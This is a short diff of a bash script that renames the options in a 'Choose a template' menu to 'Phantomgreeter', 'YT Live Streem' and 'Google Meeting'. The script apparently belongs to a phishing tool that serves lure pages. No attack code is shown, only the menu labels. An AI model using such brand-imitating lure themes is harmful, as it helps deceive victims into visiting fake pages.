@@ -295,9 +295,9 @@ EOF
 
 select_template() {
   printf "\n-----Choose a template----\n"    
-  printf "\n\e[1;92m[01]\e[0m\e[1;93m Festival Wishing\e[0m\n"
-  printf "\e[1;92m[02]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-  printf "\e[1;92m[03]\e[0m\e[1;93m Online Meeting\e[0m\n"
+  printf "\n\e[1;92m[01]\e[0m\e[1;93m Phantomgreeter \e[0m\n"
+  printf "\e[1;92m[02]\e[0m\e[1;93m YT Live Streem \e[0m\n"
+  printf "\e[1;92m[03]\e[0m\e[1;93m Google Meeting \e[0m\n"
   
   default_option_template="1"
   read -p $'\n\e[1;92m[+] Choose a template: [Default is 1] \e[0m' option_tem
